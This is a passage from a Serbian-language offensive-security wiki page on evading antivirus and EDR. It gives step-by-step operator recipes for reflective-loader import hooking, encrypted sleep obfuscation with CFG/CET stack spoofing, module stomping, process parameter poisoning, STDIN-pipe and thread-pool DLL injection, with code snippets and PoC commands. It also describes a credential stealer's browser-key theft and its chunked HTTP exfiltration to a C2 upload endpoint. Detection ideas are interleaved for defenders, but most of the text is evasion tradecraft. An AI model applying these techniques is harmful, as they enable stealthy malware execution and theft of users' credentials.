Ако контролишеш reflective loader, можеш да hook-ујеш импорте **током** `ProcessImports()` тако што ћеш заменити loader-ов `GetProcAddress` pointer прилагођеним resolver-ом који прво проверава hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Направи **резидентни PICO** (трајни PIC објекат) који остаје активан након што се привремени loader PIC ослободи.
- Извези функцију `setup_hooks()` која преписује loader-ов import resolver (нпр. `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` прескочи ordinal импорте и користи hook lookup заснован на hash-у, као што је `__resolve_hook(ror13hash(name))`. Ако hook постоји, врати га; у супротном позови прави `GetProcAddress`.
- Региструј циљне hook функције у време повезивања помоћу Crystal Palace уноса `addhook "MODULE$Func" "hook"`. Hook остаје важећи јер се налази у резидентном PICO-у.

Тако се постиже **IAT redirection при учитавању** без patchовања code section-а учитаног DLL-а након учитавања.

### Форсирање hookable импорта када циљ користи PEB-walking

Hook-ови при учитавању се активирају само ако је функција стварно у IAT-у циља. Ако модул разрeшава API функције преко PEB-walk-а и hash-а (без import уноса), форсирај прави import како би га loader-ов `ProcessImports()` обрадио:

- Замени разрeшавање извезених функција помоћу hash-а (нпр. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) директном референцом као што је `&WaitForSingleObject`.
- Compiler ће генерисати IAT унос, што омогућава пресретање када reflective loader разрeшава импорте.

### Sleep/idle obfuscation у Ekko стилу без patchовања `Sleep()`

Уместо patchовања `Sleep`, hook-уј **стварне wait/IPC примитиве** које implant користи (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). За дуга чекања обмотај позив у ланац за obfuscation у Ekko стилу који шифрује image у меморији током idle периода:<sup>[[31]](#references)[[27]](#references)</sup>

- Користи `CreateTimerQueueTimer` за заказивање низа callback-ова који позивају `NtContinue` са припремљеним `CONTEXT` frame-овима.
- Типичан ланац (x64): постави image на `PAGE_READWRITE` → RC4 шифровање преко `advapi32!SystemFunction032` над целим мапираним image-ом → обави блокирајуће чекање → RC4 дешифровање → **врати дозволе по секцијама** проласком кроз PE секције → сигнализирај завршетак.
- `RtlCaptureContext` даје шаблонски `CONTEXT`; клонирај га у више frame-ова и постави регистре (`Rip/Rcx/Rdx/R8/R9`) тако да позивају сваки корак.

Оперативни детаљ: врати „success“ за дуга чекања (нпр. `WAIT_OBJECT_0`) како би позивалац наставио док је image маскиран. Овај шаблон скрива модул од скенера током idle периода и избегава класични потпис „patched `Sleep()`“.

Идеје за детекцију (засноване на телеметрији)
- Налети `CreateTimerQueueTimer` callback-ова који упућују на `NtContinue`.
- Употреба `advapi32!SystemFunction032` над великим, непрекидним баферима величине image-а.
- `VirtualProtect` над великим опсегом, након чега следи прилагођено враћање дозвола по секцијама.

### Runtime CFG регистрација за sleep-obfuscation gadgets

На CFG-ом омогућеним циљевима, први индиректни скок на gadget унутар функције, као што је `jmp [rbx]` или `jmp rdi`, обично ће срушити процес са `STATUS_STACK_BUFFER_OVERRUN`, јер gadget није присутан у CFG metadata-и модула. Да би ланци у Ekko/Kraken стилу радили у ојачаним процесима:<sup>[[30]](#references)</sup>

- Региструј свако индиректно одредиште које ланац користи помоћу `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` и уноса `CFG_CALL_TARGET_VALID`.
- За адресе унутар учитаних image-ова (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` мора да почне од **основне адресе image-а** и обухвати **целу величину image-а**.
- За ручно мапиране/PIC/stomped регионе користи **основну адресу алокације** и величину алокације.
- Означи не само dispatch gadget већ и извезене функције до којих се долази индиректно (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event системске функције) и све извршне секције које контролише нападач, а које ће постати индиректна одредишта.

Ово претвара sleep ланце у ROP/JOP стилу из „ради само у процесима без CFG-а“ у поново употребљиву примитиву за `explorer.exe`, browser-е, `svchost.exe` и друге endpoint-е компајлиране са `/guard:cf`.

### CET-safe лажирање стека за нити у sleep стању

Потпуна замена `CONTEXT`-а је упадљива и може да изазове проблеме на CET Shadow Stack системима, јер лажирани `Rip` и даље мора да буде усклађен са hardware shadow stack-ом. Безбеднији образац за маскирање током sleep-а је:<sup>[[30]](#references)</sup>

- Изабери другу нит у истом процесу и прочитај границе њеног `NT_TIB` / TEB стека (`StackBase`, `StackLimit`) преко `NtQueryInformationThread`.
- Направи резервну копију стварног TEB/TIB-а тренутне нити.
- Сними стварни контекст нити у sleep стању помоћу `GetThreadContext`.
- Копирај **само** стварни `Rip` у лажирани контекст, остављајући лажирани `Rsp`/стање стека непромењеним.
- Током sleep периода копирај `NT_TIB` лажиране нити у TEB тренутне нити, тако да stack walker-и unwind-ују унутар легитимног опсега стека.
- По завршетку чекања врати оригинални TIB и контекст нити.

Ово чува instruction pointer који је усклађен са CET-ом, а истовремено обмањује EDR stack walker-е који се ослањају на TEB stack metadata-у да би потврдили unwind-ове.

### Алтернатива заснована на APC-у: Kraken Mask

Ако је dispatch преко timer queue-а превише препознатљив по потпису, исти низ sleep-encrypt-spoof-restore може да се изврши из суспендоване помоћне нити помоћу заказаних APC-ова:<sup>[[27]](#references)</sup>

- Направи помоћну нит са `NtTestAlert` као улазном тачком.
- Закажи припремљене `CONTEXT` frame-ове/APC-ове помоћу `NtQueueApcThread` и обради их помоћу `NtAlertResumeThread`.
- Стање ланца чувај на heap-у уместо на стеку помоћне нити како би се избегло исцрпљивање подразумеваног стека нити од 64 KB.
- Користи `NtSignalAndWaitForSingleObject` да атомски сигнализираш почетни event и блокираш нит.
- Суспендуј главну нит пре враћања TIB-а/контекста (`NtSuspendThread` → restore → `NtResumeThread`) да би се смањио временски прозор у којем би скенер могао да затекне делимично враћен стек.

Ово замењује потпис `CreateTimerQueueTimer` + `NtContinue` потписом помоћне нити/APC-а, уз задржавање истих циљева RC4 маскирања и лажирања стека.

Додатне идеје за детекцију
- `NtSetInformationVirtualMemory` са `VmCfgCallTargetInformation` непосредно пре sleep-а, чекања или APC dispatch-а.
- `GetThreadContext`/`SetThreadContext` обавијени око `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` или `ConnectNamedPipe`.
- `NtQueryInformationThread` праћен директним уписима у границе стека TEB/TIB-а тренутне нити.
- Ланци `NtQueueApcThread`/`NtAlertResumeThread` који индиректно стижу до `SystemFunction032`, `VirtualProtect` или помоћних функција за враћање дозвола секција.
- Поновљена употреба кратких gadget потписа као што су `FF 23` (`jmp [rbx]`) или `FF E7` (`jmp rdi`) као dispatch pivot-а унутар потписаних модула.


## Прецизно Module Stomping

Module stomping покреће payload-е из **`.text` секције DLL-а који је већ мапиран унутар циљног процеса**, уместо да алоцира очигледну приватну извршну меморију или учита свеж sacrificial DLL. Циљ за преписивање треба да буде **учитан image подржан на диску**, чији кодни простор може да прими payload без оштећивања путања извршавања које су процесу и даље потребне.<sup>[[1]](#references)[[2]](#references)</sup>

### Поуздан избор циља

Наивни stomping над уобичајеним модулима као што су `uxtheme.dll` или `comctl32.dll` је крхак: DLL можда није учитан у удаљеном процесу, а премали кодни регион може да сруши процес. Поузданији поступак је:

1. Наброј модуле циљног процеса и остави само DLL-ове који су већ учитани, користећи **списак укључених имена**.
2. Прво направи payload и забележи његову **тачну величину у бајтовима**.
3. Скенирај DLL-ове на диску и упореди величину PE секције **`.text` `Misc_VirtualSize`** са величином payload-а. Ово је важније од величине датотеке јер одражава величину извршне секције **када је мапирана у меморији**.
4. Парсирај **Export Address Table (EAT)** и изабери RVA извезене функције као почетни offset за stomp.
5. Израчунај **радијус утицаја**: ако payload премаши границу изабране функције, преписаће суседне извезене функције распоређене после ње у меморији.

Типични помоћни алати за извиђање/избор циља уочени у пракси:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljenom procesu da biste izbegli telemetriju koju stvaraju `LoadLibrary`/neočekivana učitavanja image-a.
- Dajte prednost export-ima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni tokovi koda mogu naići na izmenjene bajtove pre ili posle kreiranja threada.
- Za velike implant-e često je potrebno promeniti embedding shellcode-a iz string literala u **inicijalizator sa nizom bajtova/viticastim zagradama** kako bi ceo bafer bio ispravno predstavljen u izvoru injector-a.

Ideje za detekciju
- Udaljeni upisi u izvršne stranice podržane image-om (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto uobičajenijih privatnih RWX/RX alokacija.
- Ulazne tačke export-a čiji se bajtovi u memoriji više ne podudaraju sa datotekom na disku.
- Udaljeni thread-ovi ili preusmeravanja konteksta koji započinju izvršavanje unutar export-a legitimnog DLL-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje thread-a.

## Trovanje parametara procesa (P3)

Trovanje parametara procesa (P3) je tehnika **process-injection / EDR-evasion** koja zaobilazi klasični put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre `CreateProcessW` u child process** i čuva ih u `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nosači podložni trovanju, koje kopira `CreateProcessW`

Korisni nosači su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (uz `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja nosača:

- `lpCommandLine` mora pokazivati na **memoriju u koju se može upisivati** za `CreateProcessW`, a ograničen je na **32,767 Unicode znakova**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block uzastopnih `NAME=VALUE\0` nizova, završenih dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim, dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitiv za prenos payload-a**. Operater kreira child process sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez udaljenih API-ja za upis

Nakon kreiranja child process-a, pronađite kopirani bafer pomoću **primitiva samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobijte `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog parametarskog bafera

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 lanac je:

1. Kreirajte proces na uobičajen način (ne suspendovan)
2. Učinite izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebite handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmerite izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepišite `RIP`)

Za razliku od klasičnih tokova rada za otmicu niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadgledaju zbog ubacivanja koda:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje nultog bajta i shellcode u fazama

Sva tri nosača su **stringovi ili podaci nalik stringovima**, pa se neobrađeni payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva faza bez nultih bajtova** koja ponovo kreira konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da pravi stringove na steku, argumente API-ja, putanje do DLL-ova ili loader za shellcode druge faze, a da u transportovanom parametru ne ugrađuje null bajtove.

### Pozivi API-ja zasnovani na steku iz prve faze

Kada prva faza mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi **16-byte alignment** za `RSP` pre poziva

Druga faza zatim može da se kopira sa steka u alokaciju sa zaštitom `PAGE_READWRITE`, koja se pomoću `VirtualProtect` menja u `PAGE_EXECUTE_READ`, a zatim se izvršavanje preusmerava na nju, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za lov na pretnje:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice parametara procesa postavljaju kao izvršne
- nakon te promene zaštite sledi `SetThreadContext` / `NtSetContextThread`
- udaljeno čitanje `PEB`, a zatim i `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti ili vrednosti sa visokom entropijom za `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` prilikom kreiranja procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalni primitiv za izvršavanje: kopiranom parametru i dalje je potrebna promena dozvole za izvršavanje i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno dolazi do sumnjivih primitiva kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Ubrizgavanje preko STDIN cevi konzole

Interaktivni podređeni proces konzole takođe može da se koristi kao **primitiv za prenos payload-a**. Injector preusmerava standardni ulaz podređenog procesa na cev i šalje marker, a zatim shellcode. Nakon što program konzole učita podatke u sopstvenu privatnu memoriju, injector pronalazi taj bafer, čini ga izvršnim i preusmerava nit podređenog procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali je to i dalje process injection, a ne opšti EDR bypass.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, koji kreira **anonimnu cev**. Windows interno implementira anonimne cevi pomoću objekata cevi sa jedinstvenim imenima, ali PoC ne bira putanju `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreira nasleđive ručke sa podrazumevanim bezbednosnim deskriptorom, postavlja ručku za čitanje u `STARTUPINFO.hStdInput`, postavlja `STARTF_USESTDHANDLES` i pokreće novi podređeni proces uz omogućeno nasleđivanje ručki. Zato ovaj PoC pokreće zadati izvršni fajl konzole; ne povezuje svoju cev sa postojećim procesom.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći niz koraka:<sup>[[41]](#references)</sup>

1. Kreira parove anonimnih cevi za `STDIN` i `STDOUT` podređenog procesa. Isključuje nasleđivanje na dve ručke roditeljskog procesa i zatvara kopije ručki podređenog procesa u roditeljskom procesu nakon kreiranja procesa.
2. Pokreće interaktivni izvršni fajl kao što je `netsh.exe` ili `nslookup.exe` pomoću `CREATE_NEW_CONSOLE`. Podređeni proces nasleđuje preusmerene standardne ručke.
3. Šalje ceo binarni niz `rawData` pomoću `WriteFile` kroz ručku `STDIN` roditeljskog procesa. Program konzole obrađuje bajtove i ostavlja njihovu kopiju u jednom od svojih privatnih dodeljenih regiona.
4. Prolazi kroz adresni prostor podređenog procesa pomoću `VirtualQueryEx`, čita moguće regione `MEM_PRIVATE` pomoću `ReadProcessMemory` i traži marker na početku niza `rawData`.
5. Menja zaštitu otkrivenog bafera u `PAGE_EXECUTE_READWRITE` pomoću `VirtualProtectEx`.
6. Pronalazi glavnu nit, suspenduje je, postavlja `RIP` na `found_address + 0x19` pomoću `NtSetContextThread` i nastavlja njeno izvršavanje.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija je specifična za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Pri zameni payload-a sačuvajte taj raspored ili istovremeno ažurirajte marker, vektor za pretragu, veličinu niza i pomeraj za izvršavanje. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao loše karaktere. Ovaj postupak ne menja token ni privilegije deteta.<sup>[[41]](#references)</sup>

Za male nativne pomoćne programe i obrasce za kompajliranje payload-a pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection pomoću callback-a thread pool-a bez shellcode-a (DLLParty)

DLLParty prilagođava thread-pool injection u stilu PoolParty tako da postojeći worker ciljnog procesa pozove `LoadLibraryA`, umesto da izvrši ubačeni callback stub. Njegov primitiv za dispečovanje je `TP_DIRECT` completion koji se stavlja u red čekanja na I/O completion port ciljnog pool-a. Ovo ne zaobilazi dozvole procesa: PoC poziva `OpenProcess(PROCESS_ALL_ACCESS)` i zahteva čitljivu/upisivu memoriju cilja, kao i mogućnost dupliciranja worker-factory i completion-port handle-ova.<sup>[[46]](#references)[[47]](#references)</sup>

Na Windows x64, worker prosleđuje pokazivač na `TP_CALLBACK_INSTANCE` koji se nalazi na steku u `RCX`, prvom argumentu callback-a. `LoadLibraryA` tumači taj isti pokazivač kao `LPCSTR`. Na testiranoj putanji, `TppWorkerThread` formira pokazivač na `RSP+0x178`, dok se prvi uobičajeni upis u taj objekat obavlja na `RSP+0x1d0`. Zato putanja DLL-a završena nulom, koja staje unutar ovog prefiksa od 0x58 bajtova, može da se smesti na početak instance i da ne bude prepisana pre dispečovanja. Ovo zapažanje važi za konkretnu verziju i nije dokumentovana garancija Windows ABI-ja.<sup>[[46]](#references)[[47]](#references)</sup>

Referentni postupak je sledeći:<sup>[[46]](#references)[[47]](#references)</sup>

1. Nabrojte handle-ove ciljnog procesa pomoću `NtQuerySystemInformation(SystemHandleInformation)` i identifikujte `TpWorkerFactory` upitom za tipove objekata. Duplicirajte worker-factory handle i upitajte `WorkerFactoryBasicInformation`; `StartParameter` daje udaljeni `TP_POOL`. Preskočite factory-je čiji je `TotalWorkerCount == 0`.
2. Pročitajte `TP_POOL.CompletionPort` i prođite kroz privatnu listu worker-a pool-a. Na testiranoj x64 verziji Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), zaglavlje liste nalazi se na `pool+0x60`; svaka veza je na `worker+0x10`, pa je slot callback-instance na `worker+0x38` jednak `link+0x28`. PoC proverava poravnanje pokazivača, recipročne veze, pripadnost pool-u, nenulte ID-jeve niti, ponovljene čvorove i stabilno zaglavlje liste.
3. Upišite putanju DLL-a u **svaki** pronađeni slot worker-a jer bilo koji worker može da preuzme completion iz reda čekanja. Smestite `TP_DIRECT` sa `Callback = LoadLibraryA` u upisivu memoriju cilja. PoC koristi `last_slot-0x500` na steku worker-a umesto `VirtualAllocEx`; taj pomeraj je eksperimentalan i ne sme da se preklapa sa aktivnim podacima steka.
4. Duplicirajte handle completion-port-a cilja i pozovite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adresa udaljenog `TP_DIRECT` objekta je completion key. Postojeći worker zatim poziva `LoadLibraryA` sa prepisanim pokazivačem na callback-instance, čime učitava DLL kojoj cilj već može da pristupi.

PoC prima PID ciljnog procesa (`DLLParty.exe <target_pid>`) i koristi hard-kodiranu putanju DLL-a u `DLLParty.cpp`; pre pravljenja x64 izvršne datoteke podesite putanju kojoj cilj može da pristupi. Takođe koristi adresu `LoadLibraryA` iz sopstvenog procesa kao udaljeni callback, pa pretpostavlja da ta adresa važi i u cilju. Kod ne proverava da li dužina putanje staje u prefiks od 0x58 bajtova niti da li je obilazak worker-a pronašao slot pre indeksiranja poslednjeg elementa. Ponovo proverite privatne pomeraje, raspored steka i upisiv prostor za verziju cilja. Izostavljanje `CreateRemoteThreadEx`, shellcode-a i `VirtualAllocEx` ne uklanja upise između procesa niti telemetriju učitavanja DLL-a.<sup>[[46]](#references)[[47]](#references)</sup>

## Tradecraft SantaStealer-a za fileless izbegavanje detekcije i krađu akreditiva

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni info-stealer-i kombinuju AV bypass, anti-analysis i pristup akreditivima u jednom postupku.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako se pronađe ćirilični raspored, uzorak pravi prazan marker `CIS` i prekida rad pre pokretanja stealers-a, čime se obezbeđuje da se nikad ne aktivira u isključenim lokalizacijama, a pritom ostavlja artefakt za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita `check_antivm` logika

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenom rolling checksum funkcijom i upoređuje ga sa ugrađenim listama blokiranih debuggera/sandboxa; ponavlja checksum za ime računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava svojstva sistema (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox additions i vrši vremenske provere oko pauza kako bi otkrila single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless pomoćni program + dvostruko ChaCha20 reflective loading učitavanje

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili zapisuje na disk ili ručno mapira u memoriju; u fileless režimu sam razrešava imports/relocations, tako da se ne zapisuju nikakvi pomoćni artefakti.
- Taj helper čuva DLL druge faze, dvaput šifrovan ChaCha20 algoritmom (dva ključa od 32 bajta + nonce vrednosti od 12 bajtova). Posle oba prolaza, blob se učitava reflective loading tehnikom (bez `LoadLibrary`) i poziva exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste reflective process hollowing sa direct-syscall pristupom kako bi ubacile kod u aktivni Chromium pregledač, nasledile AppBound Encryption ključeve i dešifrovale lozinke/kolačiće/podatke kreditnih kartica direktno iz SQLite baza podataka, uprkos ABE zaštiti.


### Modularno prikupljanje u memoriji i HTTP eksfiltracija u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, dodaci pregledača itd.). Svaka nit upisuje rezultate u shared buffers i prijavljuje broj svojih datoteka nakon približno 45-sekundnog čekanja na niti.
- Po završetku, sve se arhivira cu statički linkovanom bibliotekom `miniz` kao `%TEMP%\\Log.zip`. Zatim `ThreadPayload1` čeka 15 sekundi i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažno predstavljajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki deo dodaje `User-Agent: upload`, `auth: <build_id>`, opcioni `w: <campaign_tag>`, a poslednji deo dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne taktike izbegavanja: Precizno gaženje modula](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, nema više besplatnog prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje call stacka](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Da li treba da verujete svom zero trust modelu? Zaobilaženje Zscaler provera bezbednosnog stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Zloupotreba prosleđenih exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar prosleđenih exports u Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamički linkovanih biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Pokretač CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz zaštitu Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Probijanje zaštitne ljuske Windows Defendera tehnikom preusmeravanja fascikli](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza čiste zavese: od RAT-a do buildera, pa do programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Zaustavljanje Node.js malware-a praćenjem API-ja](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: kako Crystal Palace uspavljuje Adaptix](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko obfuskacija spavanja](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje Dotnet ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: praktičan vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Pretvaranje drajvera za sanaciju Defendera u primitivu za kernel operacije](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kreiranje funkcija sa samosakrivanjem pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
